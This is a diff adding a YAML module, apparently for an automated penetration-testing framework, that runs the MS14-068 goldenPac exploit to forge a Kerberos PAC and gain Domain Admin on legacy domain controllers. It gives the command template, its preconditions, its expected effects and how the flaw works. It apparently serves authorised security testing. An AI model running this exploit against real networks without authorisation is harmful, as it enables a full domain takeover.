@@ -1,0 +1,29 @@
+name: goldenpac_ms14068
+category: ad
+description: MS14-068 goldenPac — forge PAC claiming Domain Admin (legacy DCs)
+preconditions:
+- service.port==88
+- has_cred
+- domain_joined
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+command_template: goldenPac.py '{domain}/{username}:{password}@{target_ip}'
+parser: impacket_parser
+expected_effects:
+- domain_admin_session
+- pac_forged
+- has_cred
+falsifier:
+  pattern: KDC_ERR|patched|KRB_AP_ERR_BAD_INTEGRITY|denied
+  timeout: 30
+model_tier: haiku
+mechanism: |
+  CVE-2014-6324 (MS14-068). Pre-patch KDC failed to verify the PAC signature using
+  the krbtgt key, allowing a forged PAC claiming Domain Admin membership to be
+  accepted. Only relevant against legacy 2003-2008R2 DCs but those exist in the wild.
+references:
+  ocd_mindmap: 'Branch 9: MS14-068 / goldenPac (legacy DCs)'
+  hacktricks: windows-hardening/active-directory-methodology/golden-ticket.md
